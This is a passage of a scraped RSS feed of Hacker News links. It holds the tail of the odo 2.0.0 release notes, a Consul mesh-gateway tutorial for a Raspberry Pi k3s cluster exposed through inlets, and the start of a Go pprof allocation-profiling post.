<p>Edit <code>Environment Variables</code> using search:</p>

<ol>
  <li>
    <p>Click <strong>Search</strong> and type <code>env</code> or <code>environment</code>.</p>
  </li>
  <li>
    <p>Select <strong>Edit environment variables for your account</strong>.</p>
  </li>
  <li>
    <p>Select <strong>Path</strong> from the <strong>Variable</strong> section and click <strong>Edit</strong>.</p>
  </li>
  <li>
    <p>Click <strong>New</strong> and type <code>C:\go-bin</code> into the field or click    <strong>Browse</strong> and select the directory, and click <strong>OK</strong>.</p>
  </li>
</ol>

<h3 id="setting-the-path-variable-for-windows-78">Setting the <code>PATH</code> variable for Windows 7/8</h3>

<p>The following example demonstrates how to set up a path variable. Your binaries can be located in any location, but this example uses C:\go-bin as the location.</p>

<ol>
  <li>
    <p>Create a folder at <code>C:\go-bin</code>.</p>
  </li>
  <li>
    <p>Right click <strong>Start</strong> and click <strong>Control Panel</strong>.</p>
  </li>
  <li>
    <p>Select <strong>System and Security</strong> and then click <strong>System</strong>.</p>
  </li>
  <li>
    <p>From the menu on the left, select the <strong>Advanced systems settings</strong>  and click the <strong>Environment Variables</strong> button at the bottom.</p>
  </li>
  <li>
    <p>Select <strong>Path</strong> from the <strong>Variable</strong> section and click <strong>Edit</strong>.</p>
  </li>
  <li>
    <p>Click <strong>New</strong> and type <code>C:\go-bin</code> into the field or click    <strong>Browse</strong> and select the directory, and click <strong>OK</strong>.</p>
  </li>
</ol>



<p><strong>New features:</strong></p>

<ul>
  <li>implement odo describe for devfile <a href="https://github.com/openshift/odo/issues/3644">#3644</a></li>
  <li>Release 2.0.0 <a href="https://github.com/openshift/odo/pull/4021">#4021</a> (<a href="https://github.com/cdrage">cdrage</a>)</li>
  <li>Move Operator Hub out of experimental mode <a href="https://github.com/openshift/odo/pull/3938">#3938</a> (<a href="https://github.com/dharmit">dharmit</a>)</li>
  <li>Implement clonePath, update source code sync location <a href="https://github.com/openshift/odo/pull/3907">#3907</a> (<a href="https://github.com/adisky">adisky</a>)</li>
</ul>

<p><strong>Code Refactoring:</strong></p>

<ul>
  <li>‚Äúodo link‚Äù help message should not check for ClusterServiceVersion support <a href="https://github.com/openshift/odo/issues/4008">#4008</a></li>
  <li>API version and schema version tests should be migrated to devfileV2 <a href="https://github.com/openshift/odo/issues/3794">#3794</a></li>
  <li>Do not check for CSV when initializing odo link command <a href="https://github.com/openshift/odo/pull/4010">#4010</a> (<a href="https://github.com/dharmit">dharmit</a>)</li>
  <li>Update odo debug ‚Äìhelp screen <a href="https://github.com/openshift/odo/pull/3963">#3963</a> (<a href="https://github.com/cdrage">cdrage</a>)</li>
  <li>Clarify description of the force-build flag in help text for odo push <a href="https://github.com/openshift/odo/pull/3958">#3958</a> (<a href="https://github.com/johnmcollier">johnmcollier</a>)</li>
  <li>Switch to use project instead of namespace in env <a href="https://github.com/openshift/odo/pull/3951">#3951</a> (<a href="https://github.com/GeekArthur">GeekArthur</a>)</li>
  <li>Remove the namespace flag from odo <a href="https://github.com/openshift/odo/pull/3949">#3949</a> (<a href="https://github.com/johnmcollier">johnmcollier</a>)</li>
  <li>Migrate devfile cmd validation to validate pkg <a href="https://github.com/openshift/odo/pull/3912">#3912</a> (<a href="https://github.com/maysunfaisal">maysunfaisal</a>)</li>
  <li>Remove command group type init <a href="https://github.com/openshift/odo/pull/3898">#3898</a> (<a href="https://github.com/adisky">adisky</a>)</li>
</ul>

<p><strong>Bugs:</strong></p>

<ul>
  <li>‚Äúodo link -h‚Äù shows same message for 3.x &amp; 4.x clusters <a href="https://github.com/openshift/odo/issues/3992">#3992</a></li>
  <li>make goget-tools fails due to go mod dependency <a href="https://github.com/openshift/odo/issues/3983">#3983</a></li>
  <li>Handle edge case when index file is commented in .gitignore <a href="https://github.com/openshift/odo/issues/3961">#3961</a></li>
  <li>Java component build execution requires pom.xml <a href="https://github.com/openshift/odo/issues/3943">#3943</a></li>
  <li>default registry not initialized when user already has a preference.yaml file <a href="https://github.com/openshift/odo/issues/3940">#3940</a></li>
  <li><code>odo url create</code> shouldn‚Äôt require a port if only one port exists in the devfile <a href="https://github.com/openshift/odo/issues/3923">#3923</a></li>
  <li><code>odo push</code> with alternate ‚Äìrun-command should push complete file set upon new pod creation <a href="https://github.com/openshift/odo/issues/3918">#3918</a></li>
  <li>converting s2i items to devfile items does not set the Endpoint‚Äôs name properly <a href="https://github.com/openshift/odo/issues/3910">#3910</a></li>
  <li>Unexpected EOF during watch stream event decoding, watch channel was closed. <a href="https://github.com/openshift/odo/issues/3905">#3905</a></li>
  <li>odo debug serial tests script panic out <a href="https://github.com/openshift/odo/issues/3897">#3897</a></li>
  <li>Default URL does not propagate to <code>.odo/env/env.yaml</code> and you cannot delete it. <a href="https://github.com/openshift/odo/issues/3893">#3893</a></li>
  <li>Breaking component create without exposing port <a href="https://github.com/openshift/odo/issues/3882">#3882</a></li>
  <li>odo registry list causes panic if preference has not been setup <a href="https://github.com/openshift/odo/issues/3842">#3842</a></li>
  <li>odo watch goes into infinite push loop if ignore flag is used <a href="https://github.com/openshift/odo/issues/3819">#3819</a></li>
  <li>‚Äòodo create‚Äô should properly validate devfiles <a href="https://github.com/openshift/odo/issues/3778">#3778</a></li>
  <li>context flag does not work with devfile url create <a href="https://github.com/openshift/odo/issues/3767">#3767</a></li>
  <li>odo log is unusable for multi container components <a href="https://github.com/openshift/odo/issues/3711">#3711</a></li>
  <li>‚Äúodo registry add‚Äù adds registry for invalid url in devfileV2 <a href="https://github.com/openshift/odo/issues/3451">#3451</a></li>
  <li>Prints help message based on backend cluster <a href="https://github.com/openshift/odo/pull/3993">#3993</a> (<a href="https://github.com/dharmit">dharmit</a>)</li>
  <li>s2i component fix: use Config instead of ContainerConfig for port detection <a href="https://github.com/openshift/odo/pull/3957">#3957</a> (<a href="https://github.com/kadel">kadel</a>)</li>
  <li>3923- url creation with optional port flag <a href="https://github.com/openshift/odo/pull/3950">#3950</a> (<a href="https://github.com/yangcao77">yangcao77</a>)</li>
  <li>Add mandatory file ignores when using ‚Äìignore flag <a href="https://github.com/openshift/odo/pull/3942">#3942</a> (<a href="https://github.com/maysunfaisal">maysunfaisal</a>)</li>
  <li>Fix default registry support <a href="https://github.com/openshift/odo/pull/3941">#3941</a> (<a href="https://github.com/GeekArthur">GeekArthur</a>)</li>
  <li>Update s2i image from library for ppc64le <a href="https://github.com/openshift/odo/pull/3939">#3939</a> (<a href="https://github.com/sarveshtamba">sarveshtamba</a>)</li>
  <li>update s2i to devfile conversion as per new url design <a href="https://github.com/openshift/odo/pull/3930">#3930</a> (<a href="https://github.com/adisky">adisky</a>)</li>
  <li>Add test-case for validating devfiles on component create <a href="https://github.com/openshift/odo/pull/3908">#3908</a> (<a href="https://github.com/johnmcollier">johnmcollier</a>)</li>
  <li>Improve URL format validation <a href="https://github.com/openshift/odo/pull/3900">#3900</a> (<a href="https://github.com/GeekArthur">GeekArthur</a>)</li>
  <li>implement odo describe for devfile <a href="https://github.com/openshift/odo/pull/3843">#3843</a> (<a href="https://github.com/metacosm">metacosm</a>)</li>
</ul>

<p><strong>Tests:</strong></p>

<ul>
  <li>Test failures while running <code>test-cmd-push</code> test suite on ppc64le <a href="https://github.com/openshift/odo/issues/3539">#3539</a></li>
  <li>Test failures while running <code>test-cmd-storage</code> test suite on ppc64le <a href="https://github.com/openshift/odo/issues/3531">#3531</a></li>
</ul>

<p><strong>Documentation &amp; Discussions:</strong></p>

<ul>
  <li>Update installation page to include instructions for VSCode / IDE‚Äôs <a href="https://github.com/openshift/odo/issues/3970">#3970</a></li>
  <li>Update docs according to schema changes in the command and component struct <a href="https://github.com/openshift/odo/issues/3925">#3925</a></li>
  <li>Help for <code>odo push -f</code> should explain that the full set of project source is pushed to the container <a href="https://github.com/openshift/odo/issues/3919">#3919</a></li>
  <li>Make the <code>odo.dev</code> front page documentation simpler <a href="https://github.com/openshift/odo/issues/3887">#3887</a></li>
  <li>Add debug examples for ‚Äúodo debug -h‚Äù <a href="https://github.com/openshift/odo/issues/3871">#3871</a></li>
  <li>Remove technology preview feature for debug command <a href="https://github.com/openshift/odo/issues/3869">#3869</a></li>
  <li>Update devfile ‚Äúodo.dev‚Äù doc <a href="https://github.com/openshift/odo/issues/3868">#3868</a></li>
  <li>Documentation for Operator Hub integration in v2 <a href="https://github.com/openshift/odo/issues/3810">#3810</a></li>
  <li>Document on converting s2i to devfile <a href="https://github.com/openshift/odo/issues/3749">#3749</a></li>
  <li>Adds a blog folder <a href="https://github.com/openshift/odo/pull/4003">#4003</a> (<a href="https://github.com/cdrage">cdrage</a>)</li>
  <li>Document odo and Operator Hub integration <a href="https://github.com/openshift/odo/pull/3982">#3982</a> (<a href="https://github.com/dharmit">dharmit</a>)</li>
  <li>Add instructions on how to install VSCode plugin <a href="https://github.com/openshift/odo/pull/3977">#3977</a> (<a href="https://github.com/cdrage">cdrage</a>)</li>
  <li>Update installation page to indicate beta-1 <a href="https://github.com/openshift/odo/pull/3960">#3960</a> (<a href="https://github.com/cdrage">cdrage</a>)</li>
  <li>Remove references to Docker support <a href="https://github.com/openshift/odo/pull/3954">#3954</a> (<a href="https://github.com/cdrage">cdrage</a>)</li>
  <li>Updates docs to use the new schema changes for commands and components <a href="https://github.com/openshift/odo/pull/3928">#3928</a> (<a href="https://github.com/mik-dass">mik-dass</a>)</li>
  <li>Update commands ouputs in docs. <a href="https://github.com/openshift/odo/pull/3927">#3927</a> (<a href="https://github.com/boczkowska">boczkowska</a>)</li>
</ul>

<p><strong>Closed issues:</strong></p>

<ul>
  <li>Determine if we want to keep Docker support in experimental mode, or disable it <a href="https://github.com/openshift/odo/issues/3955">#3955</a></li>
  <li>rename ‚Äìnamespace flag in odo push to ‚Äìproject <a href="https://github.com/openshift/odo/issues/3948">#3948</a></li>
  <li>rename odo env variable namespace to project <a href="https://github.com/openshift/odo/issues/3947">#3947</a></li>
  <li>Test failures while running <code>test-integration</code>  and <code>test-e2e-all</code> test suite on ppc64le <a href="https://github.com/openshift/odo/issues/3945">#3945</a></li>
  <li>‚Äúunknown flag: ‚Äìs2i‚Äù while running odo test suite ‚Äòtest-generic‚Äô on ppc64le <a href="https://github.com/openshift/odo/issues/3934">#3934</a></li>
  <li>odo <code>make</code> commands fail on ppc64le after latest changes. <a href="https://github.com/openshift/odo/issues/3891">#3891</a></li>
  <li>Downstream release of the odo cli <a href="https://github.com/openshift/odo/issues/3852">#3852</a></li>
  <li>clonePath should be supported in odo <a href="https://github.com/openshift/odo/issues/3729">#3729</a></li>
  <li>Move devfile command validation to validate pkg <a href="https://github.com/openshift/odo/issues/3703">#3703</a></li>
  <li><code>make test</code> throws ‚ÄúErrorf format %w has unknown verb w‚Äù error on ppc64le with latest master <a href="https://github.com/openshift/odo/issues/3607">#3607</a></li>
  <li>Move Operator Hub integration out of Experimental mode <a href="https://github.com/openshift/odo/issues/3595">#3595</a></li>
  <li>Move container image used in springboot devfile to some odo owned image repository <a href="https://github.com/openshift/odo/issues/3578">#3578</a></li>
  <li>Move the devfile feature set out of the experimental mode <a href="https://github.com/openshift/odo/issues/3550">#3550</a></li>
  <li>JSON  / machine output support for Devfile Components <a href="https://github.com/openshift/odo/issues/3521">#3521</a></li>
  <li>Component push throws error of ‚ÄúWaiting for component to start‚Äù on ppc64le <a href="https://github.com/openshift/odo/issues/3497">#3497</a></li>
  <li>odo project create throws error of connection refused on ppc64le <a href="https://github.com/openshift/odo/issues/3491">#3491</a></li>
  <li>Tests for devfiles in odo devfile registry <a href="https://github.com/openshift/odo/issues/3378">#3378</a></li>
</ul>

<p><strong>Merged pull requests:</strong></p>

<ul>
  <li>vendor: switch location of goautoneg to github <a href="https://github.com/openshift/odo/pull/3984">#3984</a> (<a href="https://github.com/kadel">kadel</a>)</li>
  <li>Remove url describe command <a href="https://github.com/openshift/odo/pull/3981">#3981</a> (<a href="https://github.com/adisky">adisky</a>)</li>
  <li>odo list follow up implementation <a href="https://github.com/openshift/odo/pull/3964">#3964</a> (<a href="https://github.com/girishramnani">girishramnani</a>)</li>
  <li>Fix test failure caused by updating springboot devfile <a href="https://github.com/openshift/odo/pull/3946">#3946</a> (<a href="https://github.com/adisky">adisky</a>)</li>
  <li>apiVersion test migrated to devfileV2 <a href="https://github.com/openshift/odo/pull/3920">#3920</a> (<a href="https://github.com/anandrkskd">anandrkskd</a>)</li>
  <li>add test for odo url create ‚Äìcontext flag <a href="https://github.com/openshift/odo/pull/3917">#3917</a> (<a href="https://github.com/girishramnani">girishramnani</a>)</li>
  <li>Update springboot devfile <a href="https://github.com/openshift/odo/pull/3799">#3799</a> (<a href="https://github.com/adisky">adisky</a>)</li>
  <li>Fix odo log for multi containers devfile <a href="https://github.com/openshift/odo/pull/3735">#3735</a> (<a href="https://github.com/adisky">adisky</a>)</li>
  <li>Make Devfile the default deployment mechanism <a href="https://github.com/openshift/odo/pull/3705">#3705</a> (<a href="https://github.com/cdrage">cdrage</a>)</li>
</ul>

						</div><!-- /.content -->
					</div></div>]]>
            </description>
            <link>https://odo.dev/blog/odo-200-ga-release/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24579814</guid>
            <pubDate>Thu, 24 Sep 2020 15:51:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Consul Service Mesh Across a Private Raspberry Pi and a Public Cloud]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24579527">thread link</a>) | @jsiebens
<br/>
September 24, 2020 | https://johansiebens.dev/posts/2020/09/consul-service-mesh-across-a-private-raspberry-pi-and-a-public-cloud/ | <a href="https://web.archive.org/web/*/https://johansiebens.dev/posts/2020/09/consul-service-mesh-across-a-private-raspberry-pi-and-a-public-cloud/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        

<figure>
    <img src="https://johansiebens.dev/uploads/alina-grubnyak-ZiQkhI7417A-unsplash-banner.png" alt="photo by Alina Grubnyak on Unsplash"> <figcaption>
            <p>photo by <a href="https://unsplash.com/@alinnnaaaa?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText" target="_blank">Alina Grubnyak</a> on <a href="https://unsplash.com/" target="_blank">Unsplash</a></p>
        </figcaption>
</figure>


<p>In my <a href="https://johansiebens.dev/posts/2020/09/scale-out-your-raspberry-pi-nomad-cluster-to-the-cloud/" target="_blank">previous post</a>, I wrote about a way to expand a Consul and Nomad cluster in a private lab to a public cloud. All the nodes, a Raspberry Pi on-premise, or a VM in a public cloud were sharing the same private network, provided by Tailscale, and workloads running on Nomad are spread across both environments. Everything is working well, but after a few days running this setup, I wasn‚Äôt sure if using Tailscale is the right approach for scaling out a local Nomad cluster to the cloud. Don‚Äôt get me wrong, I still love Tailscale; it is easy to install and to use, and is a perfect fit when you want to access some servers from everywhere. But in a more dynamic environment, where nodes are more cattle instead of pets, can come and go when required, other solutions may be better.</p>

<p>The reason for using Tailscale at first, is because all the nodes in a Consul cluster should be able to connect. In terms of Consul, I‚Äôve built a single datacenter with nodes running on-premise and in the cloud, which may seem a little bit odd when you think about it.</p>

<figure><a href="https://consul.io/">
    <img src="https://johansiebens.dev/uploads/0006/Consul_VerticalLogo_FullColor_RGB_small.png" width="150"> </a>
</figure>


<p>In this post, we have a look at a completely different approach to expand a cluster running on a Raspberry Pi to the cloud with Consul Connect and its advanced features like Mesh Gateways.</p>

<p>Consul Connect provides service-to-service connection authorization and encryption using mutual Transport Layer Security (TLS).<br>
Applications can use sidecar proxies in a service mesh configuration to establish TLS connections for inbound and outbound connections without being aware of Connect at all.</p>

<p>Consul has already for a long time support for joining multiple datacenters which operate independently and only communicate over the WAN on port 8302.</p>

<p>With WAN federation via mesh gateways allows for Consul servers in different datacenters to be federated exclusively through mesh gateways, without the need that all Consul servers in every datacenter must be able to reach each other over their WAN-advertised network address.</p>

<figure>
    <img src="https://johansiebens.dev/uploads/0006/k8s-mesh-gateway.png" alt="Secure Service Mesh Communication Across Kubernetes Clusters (source: HashiCorp Learn)"> <figcaption>
            <p>Secure Service Mesh Communication Across Kubernetes Clusters (source: <a href="https://learn.hashicorp.com/tutorials/consul/kubernetes-mesh-gateways" target="_blank">HashiCorp Learn</a>)</p>
        </figcaption>
</figure>


<p>First, we deploy a Consul cluster, with WAN federation via mesh gateway enabled, on k3s running on a Raspberry Pi. That installation will act as our primary datacenter.<br>
Next, we build a second datacenter on a public cloud provider and join this second and the primary datacenter.<br>
Finally, some services we will deploy a multi-tier application across the clusters, to demonstrate the inter-datacenter communication.</p>

<p>How to achieve this, is already explained in detail in the <a href="https://learn.hashicorp.com/tutorials/consul/kubernetes-mesh-gateways" target="_blank">Secure Service Mesh Communication Across Kubernetes Clusters</a> tutorial from HashiCorp.</p>

<p>Yet, there are some specific steps to take when using a Raspberry Pi in a private network.</p>

<p><strong>Envoy Proxy on a Raspberry Pi</strong></p>

<figure><a href="https://www.envoyproxy.io/">
    <img src="https://johansiebens.dev/uploads/0006/envoy-proxy-logo.png" width="100"> </a>
</figure>


<p>A Connect-aware proxy enables unmodified applications to use Connect. Consul includes its own built-in L4 proxy and has first class support for Envoy.<br>
Currently, Envoy is the only proxy with mesh gateway capabilities in Consul.</p>

<p>Unfortunately, at the time of writing, there are no Envoy binaries or Docker images available for the ARM architecture.<br>
They are working on supporting arm64, but for the time being, you have to build Envoy for arm64 yourself, or use the binary and Docker image that I‚Äôve build already.</p>

<p><strong>Exposing private service to the public</strong></p>

<figure><a href="https://inlets.dev/">
    <img src="https://johansiebens.dev/uploads/inlets-pro-purple.png" width="100"> </a>
</figure>


<p>As the Raspberry Pi is running in an internal network, we have to find a way to expose the mesh gateway to the outside world, so that other datacenters can connect to the private cluster.<br>
In <a href="https://johansiebens.dev/posts/2020/08/argo-cd-for-your-private-raspberry-pi-k3s-cluster/" target="_blank">another post</a>, I‚Äôve already mentioned <a href="https://inlets.dev/" target="_blank">inlets</a>, a cloud-native tunnel.<br>
Now that we are deploying are service mesh on a lightweight Kubernetes distribution, <a href="https://k3s.io/" target="_blank">k3s</a>, we can use the <code>inlets-operator</code> to automate the creation of an exit-node for a Kubernetes LoadBalancer service.</p>

<p><em>‚ÄúThe operator detects Services of type LoadBalancer, and then creates a Tunnel Custom Resource. Its next step is to provision a small VM with a public IP on the public cloud, where it will run the inlets tunnel server. Then an inlets client is deployed as a Pod within your local cluster, which connects to the server and acts like a gateway to your chosen local service.‚Äù</em></p>

<h2 id="prerequisites">Prerequisites</h2>

<p>For this tutorial, I have prepared the following:</p>

<ul>
<li><p>a DigitalOcean Access Token</p></li>

<li><p>a Kubernetes cluster running on <a href="https://digitalocean.com/" target="_blank">DigitalOcean</a> (any other provider is also ok)</p></li>

<li><p>an inlets PRO license</p></li>

<li><p>tools installed locally:</p>

<ul>
<li>kubectl, configured with one context for the cluster on DigitalOcean<br></li>
<li><a href="https://helm.sh/" target="_blank">helm</a> (version 3), the package manager for Kubernetes<br></li>
<li><a href="https://github.com/alexellis/k3sup" target="_blank">k3sup</a>, light-weight utility to get from zero to KUBECONFIG with k3s on any local or remote VM.<br></li>
<li><a href="https://github.com/alexellis/arkade" target="_blank">arkade</a>, a Golang CLI with strongly-typed flags to install Helm charts and apps to your cluster in one command.</li>
</ul></li>

<li><p>a Raspberry Pi, running Ubuntu 20.04 64bit, with a proper hostname (<code>orion-rpi4-01</code>) and IP address (<code>192.168.0.51</code>)</p></li>
</ul>

<blockquote>
<p><strong>Security Warning</strong> This tutorial is not for production use. Although we enable gossip and TLS encryption, the Helm chart used, installs an configuration of Consul without ACL enabled.</p>
</blockquote>

<h2 id="building-the-primary-datacenter-a-raspberry-pi">Building the primary datacenter a Raspberry Pi</h2>

<h3 id="create-a-k3s-cluster">Create a k3s cluster</h3>

<p>The easiest way to get a k3s cluster ready, is by using the <code>k3sup</code> tool:</p>
<div><pre><code data-lang="bash">$ k3sup install <span>\
</span><span></span>  --ip <span>192</span>.168.0.51 <span>\
</span><span></span>  --user ubuntu <span>\
</span><span></span>  --context orion-rpi4 <span>\
</span><span></span>  --merge <span>\
</span><span></span>  --k3s-extra-args <span>'--no-deploy servicelb --no-deploy traefik'</span></code></pre></div>
<p>By default, k3s comes with a load balancer, known as Klipper Load Balancer, and Traefik as an Ingress Controller.<br>
In our case we are going to let the <code>inlets-operator</code> handle LoadBalancer services, and we don‚Äôt need Traefik for the moment, hence the two <code>--no-deploy</code> flags to disable those features.<br>
After executing those two commands, a small single node k3s cluster is ready to use, and our <code>kubeconfig</code> is updated with a new context pointing to this cluster.</p>

<p><strong>Note:</strong> for this demo, I only took a single Raspberry Pi, but if you have some other Raspberry Pis available, you could always add additional nodes to this k3s cluster, e.g.</p>
<div><pre><code data-lang="bash">$ k3sup join --ip <span>192</span>.168.0.52 --server-ip <span>192</span>.168.0.51 --user ubuntu
$ k3sup join --ip <span>192</span>.168.0.53 --server-ip <span>192</span>.168.0.51 --user ubuntu</code></pre></div>
<p>Now switch to this new context and verify if the cluster is available.</p>
<div><pre><code data-lang="bash">$ kubectl config use-context orion-rpi4 
Switched to context <span>"orion-rpi4"</span>.
$ kubectl get nodes --context orion-rpi4 -o wide
NAME            STATUS   ROLES    AGE   VERSION        INTERNAL-IP    EXTERNAL-IP   OS-IMAGE             KERNEL-VERSION     CONTAINER-RUNTIME
orion-rpi4-01   Ready    master   54s   v1.18.6+k3s1   <span>192</span>.168.0.51   &lt;none&gt;        Ubuntu <span>20</span>.04.1 LTS   <span>5</span>.4.0-1015-raspi   containerd://1.3.3-k3s2</code></pre></div>
<h3 id="install-inlets-operator-with-arkade">Install inlets-operator with arkade</h3>

<p>Using arkade, we can install the <code>inlets-operator</code> using a single command, arkade runs against any Kubernetes cluster.</p>
<div><pre><code data-lang="bash">$ arkade install inlets-operator <span>\
</span><span></span> --provider digitalocean <span>\
</span><span></span> --token-file $HOME/do-access-token <span>\
</span><span></span> --license-file $HOME/inlets-pro-license.txt</code></pre></div>
<p>It takes just a few seconds until the operator pod is running.</p>
<div><pre><code data-lang="bash">$ kubectl get pods -n kube-system --selector<span>=</span>app.kubernetes.io/name<span>=</span>inlets-operator
NAME                               READY   STATUS    RESTARTS   AGE
inlets-operator-7648d7477f-2dghh   <span>1</span>/1     Running   <span>0</span>          112s</code></pre></div>
<p>From now on, every Kubernetes service of type LoadBalancer we create gets a public IP address on DigitalOcean, making the services accessible from the outside world via an inlets PRO tunnel.</p>

<h3 id="install-consul-and-mesh-gateway">Install Consul and Mesh Gateway</h3>

<p>As mentioned earlier, the steps that follow are pretty much the same as explained in the <a href="https://learn.hashicorp.com/tutorials/consul/kubernetes-mesh-gateways" target="_blank">tutorial</a> available at the HashiCorp Learn website.</p>

<p><strong>HashiCorp Helm Chart</strong></p>

<p>First, we add the HashiCorp Helm chart.</p>
<div><pre><code data-lang="bash">$ helm repo add hashicorp https://helm.releases.hashicorp.com
<span>"hashicorp"</span> has been added to your repositories</code></pre></div>
<p>Second, create a consul namespace and a secret with a gossip encryption key</p>
<div><pre><code data-lang="bash">$ kubectl create namespace consul
$ kubectl create secret generic -n consul consul-gossip-encryption-key --from-literal<span>=</span>key<span>=</span><span>$(</span>consul keygen<span>)</span></code></pre></div>
<p>Next, prepare a values.yaml file for our Consul deployment. With this configuration we will:</p>

<ul>
<li>enable gossip encryption<br></li>
<li>enable TLS encryption (required by the mesh gateway)<br></li>
<li>enable Consul Connect<br></li>
<li>enable a Mesh Gateway<br></li>
<li>enable WAN Federation<br></li>
<li>override the default Envoy image with an image compatible with arm64</li>
</ul>
<div><pre><code data-lang="yaml">global:
  name: consul
  datacenter: orion-rpi4
  image: consul:<span>1.8</span>.<span>3</span>
  imageK8S: hashicorp/consul-k8s:<span>0.18</span>.<span>1</span>
  imageEnvoy: jsiebens/envoy-arm64:<span>1.13</span>.<span>3</span>
  gossipEncryption:
    secretName: consul-gossip-encryption-key
    secretKey: key
  tls:
    enabled: <span>true</span>
  federation:
    enabled: <span>true</span>
    createFederationSecret: <span>true</span>

server:
  replicas: <span>1</span>
  bootstrapExpect: <span>1</span>
  storage: 5Gi

connectInject:
  enabled: <span>true</span>
  imageEnvoy: jsiebens/envoy-arm64:<span>1.13</span>.<span>3</span>

meshGateway:
  enabled: <span>true</span>
  replicas: <span>1</span>
  imageEnvoy: jsiebens/envoy-arm64:<span>1.13</span>.<span>3</span></code></pre></div>
<p>Notice the <code>createFederationSecret</code> entry. This should only be set in this primary datacenter. Later in this tutorial, we export the secret and copy it into the secondary datacenter. This allows the secondary datacenter to automatically negotiate WAN federation with the primary.</p>

<p>Finally, use <code>helm</code> to install Consul with the <code>hashicorp/consul</code> chart.</p>
<div><pre><code data-lang="bash">$ helm install --namespace consul --values orion-rpi4-values.yaml consul hashicorp/consul --wait</code></pre></div>
<p>This command will wait until everything is up and running, which may take a few minutes depending on your environment. When it finishes, we can have a look what is created:</p>
<div><pre><code data-lang="bash">$ kubectl get services,pods -n consul
NAME                                  TYPE           CLUSTER-IP      EXTERNAL-IP      PORT<span>(</span>S<span>)</span>                                                                   AGE
service/consul-server                 ClusterIP      None            &lt;none&gt;           <span>8501</span>/TCP,8301/TCP,8301/UDP,8302/TCP,8302/UDP,8300/TCP,8600/TCP,8600/UDP   25m
service/consul-dns                    ClusterIP      <span>10</span>.43.38.87     &lt;none&gt;           <span>53</span>/TCP,53/UDP                                               ‚Ä¶</code></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://johansiebens.dev/posts/2020/09/consul-service-mesh-across-a-private-raspberry-pi-and-a-public-cloud/">https://johansiebens.dev/posts/2020/09/consul-service-mesh-across-a-private-raspberry-pi-and-a-public-cloud/</a></em></p>]]>
            </description>
            <link>https://johansiebens.dev/posts/2020/09/consul-service-mesh-across-a-private-raspberry-pi-and-a-public-cloud/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24579527</guid>
            <pubDate>Thu, 24 Sep 2020 15:29:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Be a Wizard: Controlling volume using Gestures]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24579485">thread link</a>) | @todsacerdoti
<br/>
September 24, 2020 | https://crondev.blog/2020/09/24/be-a-wizard-controlling-volume-using-gestures/ | <a href="https://web.archive.org/web/*/https://crondev.blog/2020/09/24/be-a-wizard-controlling-volume-using-gestures/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://crondev.blog/2020/09/24/be-a-wizard-controlling-volume-using-gestures/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24579485</guid>
            <pubDate>Thu, 24 Sep 2020 15:26:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Optimizing PGX Allocations Using Pprof (Golang)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24579391">thread link</a>) | @ldelossa
<br/>
September 24, 2020 | https://www.ldelossa.is/blog/allocation_optimization_in_go | <a href="https://web.archive.org/web/*/https://www.ldelossa.is/blog/allocation_optimization_in_go">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <div><article> <p>Performance tuning is one of those programming rituals that gets oddly addicting. Seems like humans have a fundamental impulse to make a graph plot in their desired direction. This can be seen in a wide assortment of fields. Day traders watch metrics focused on their net earnings, nutritionists keep their calorie counts logged, and programmers focusing on performance obsess over memory allocations.</p> <p>After spending sometime obessing myself I found myself making large allocation improvements with some tricks in the popular <a href="https://github.com/jackc/pgx">PGX</a> library.</p> <p>I'd like to shout out <em>Kale Blanekship</em> and <em>Eric Chlebek</em> from the performance channel in #gophers slack. They provided the clues used in this post.</p> <h2>The code</h2> <p>The code that's being profiled is a new distributed lock implementation for <a href="https://github.com/quay/claircore/">ClairCore</a>. Postgres is the only required infrastructure for ClairCore by design. While it's not the best mechanim for a distributed lock, <a href="https://www.postgresql.org/docs/9.1/explicit-locking.html">postgres advisory locks</a> can be utilized to get <em>mostly</em> there.</p> <p>You can view the distlock implementation <a href="https://github.com/ldelossa/distlock">here</a></p> <h2>Reducing channel allocations</h2> <p>Our distlock implementation utilizes the request/response channel-of-channel pattern. A request object with a response channel is pushed onto a request channel. When the receiver gets the request it writes to the response channel, unblocking any client listening.</p> <p>This pattern is useful but will also alloc a lot of channels resulting in bloating the heap.</p> <p>To demonstrate this a benchmark will be taken that profiles lock acquisition and lock return.</p> <pre><code><span>$</span><span> go <span>test</span> -benchtime <span>"1m"</span>  -run xxx -bench . -memprofile memprofile.out -cpuprofile cpuprofile.out</span>
</code></pre> <p>The command above runs a 1 minute benchmark profiling both memory and cpu.</p> <p>Next lets start an interactive pprof session over the memory profile and drill into the function where the channel allocations are occuring.</p> <pre><code><span>$</span><span> go tool pprof distlock.test memprofile.out</span>

(pprof) list \.Lock
Total: 194.36MB
ROUTINE ======================== github.com/ldelossa/distlock.(*Manager).Lock in /home/louis/git/go/distlock/manager.go
      20MB       20MB (flat, cum) 10.29% of Total
         .          .     78:	}
         .          .     79:
         .          .     80:	req := request{
         .          .     81:		t:        Lock,
         .          .     82:		key:      key,
   13.50MB    13.50MB     83:		respChan: make(chan response),
         .          .     84:	}
         .          .     85:
         .          .     86:	// guaranteed to return
         .          .     87:	resp := m.g.request(req)
         .          .     88:
         .          .     89:	if !resp.ok {
         .          .     90:		return resp.ctx, func() {}
         .          .     91:	}
         .          .     92:
         .          .     93:	m.propagateCancel(ctx, resp.ctx, key)
         .          .     94:
    6.50MB     6.50MB     95:	return resp.ctx, func() {
         .          .     96:		m.unlock(key)
         .          .     97:	}
         .          .     98:}
         .          .     99:
         .          .    100:func (m *Manager) propagateCancel(parent context.Context, child context.Context, key string) {
